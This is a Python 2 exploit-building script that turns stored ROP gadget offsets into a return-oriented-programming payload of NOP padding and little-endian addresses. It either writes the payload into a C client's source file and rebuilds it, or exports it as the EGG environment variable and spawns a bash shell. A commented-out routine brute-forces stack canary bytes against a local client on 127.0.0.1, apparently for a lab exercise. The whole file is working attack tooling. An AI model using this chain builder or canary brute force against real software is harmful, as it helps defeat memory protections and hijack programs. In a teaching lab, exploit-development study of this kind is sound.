import os
import sys
import json
import shlex
import subprocess

class GenerateROPShellcode(object):
    """
    @params
    id: The id of the ROP code that needs to be converted to shellcode
    json_file: JSON file 
    """
    def __init__(self, padding, _id, json_file, print_code=False):
        self._id = _id
        self.code = ''
        self.padding = padding
        self.json_file = json_file
        self.libc_base = 0x0
        self.data_base = 0x0
        self.addresses = []
        self.shellcode = ''
        self.print_code = print_code

    def get_code(self):
        with open(self.json_file) as json_file:
            json_data = json.load(json_file)
            for k, v in json_data.iteritems():
                for values in v:
                    if values['id'] is self._id:
                        self.code = values['code']
                        self.libc_base = hex(int(values['libc_base'].replace('L', ''), 16))
                        self.data_base = hex(int(values['data_base'].replace('L', ''), 16))
        self.construct_shellcode()

    def construct_shellcode(self):
        commands = self.code.split('\n')
        for command in commands:
            tokens = command.split(':')
            if tokens[0].strip() == 'ROP command':
                self.addresses.append(hex(int(self.libc_base.replace('L', ''), 16) + int(tokens[1].replace('L', '').strip(), 16)))
            elif tokens[0].strip() == 'Address':
                self.addresses.append(hex(int(self.data_base.replace('L', ''), 16) + int(tokens[1].replace('L', '').strip(), 16)))
            else:
                self.addresses.append(hex(int(tokens[1].replace('L', '').strip(), 16)))

        # Pad only till the canary bytes so that they can be guessed
        for i in range(0, self.padding):
            self.shellcode += '90'.decode('hex')

        # self.read_stack()

        for address in self.addresses:
            self.shellcode += (address[2:].replace('L', '').zfill(8).decode('hex'))[::-1]

        if self.print_code:
            output_file = input('To which file would you like to write the shellcode? ')
            fo = open(output_file, 'r')
            contents = fo.readlines()
            fo.close()
            fo = open(output_file, 'w+')
            shellcode = 'const char default_shellcode[] = "'
            for item in list(self.shellcode):
                shellcode += ('\\x' + item.encode('hex'))
            shellcode += '";\n'
            line_num = input('At which line would you like to insert the shellcode? ')
            if ('default_shellcode' in contents[line_num - 1]):
                contents[line_num - 1] = shellcode
            else:
                contents.insert(line_num, shellcode)
            contents = ''.join(contents)
            fo.write(contents)
            fo.close()
            subprocess.call('./rebuild.sh', shell=False)
        else:
            os.putenv('EGG', self.shellcode)
            subprocess.call('/bin/bash', shell=True)

    """
    Guess the stack canary values.
    Fails if the program being exploited restarts.
    """
    """
    def read_stack(self):
        count = 8
        while (count > 0):
            status = -6
            current_byte = -1
            self.shellcode = self.shellcode + ('ff'.decode('hex'))
            while (status == -6):
                current_byte += 1
                self.value = hex(current_byte).split('x')[1].zfill(2)
                print 'Current byte: 0x{:s}'.format(self.value)
                try:
                    status = self.write_to_file()
                    print status
                except TypeError:
                    print 'TypeError'
                    status = 1
            self.shellcode = self.shellcode[:-1] + str(self.value)
            print 'Only {:d} bytes to go'.format(count)
            count = count - 1

    def write_to_file(self):
        FNULL = open(os.devnull, 'w')
        output_file = 'src/simple_client.c'
        fo = open(output_file, 'r')
        contents = fo.readlines()
        fo.close()
        fo = open(output_file, 'w+')
        line_num = 11
        contents[line_num - 1] = contents[line_num - 1][:-3] + '\\x' + self.value + '";\n\n'
        contents = ''.join(contents)
        fo.write(contents)
        fo.close()
        subprocess.call('./rebuild.sh', shell=False)
        return subprocess.call(['bin/simple_client', '127.0.0.1', '10000', 'index.html'], stdout=FNULL, stderr=subprocess.STDOUT, shell=False)
    """

def main():
    if len(sys.argv) < 4:
        print 'Padding, ID of rop code and json file required.\n'
    elif len(sys.argv) == 4:
        generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3])
        generator.get_code()
    else:
        generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3], print_code=(sys.argv[4] == 'print'))
        generator.get_code()

if __name__ == '__main__':
    main()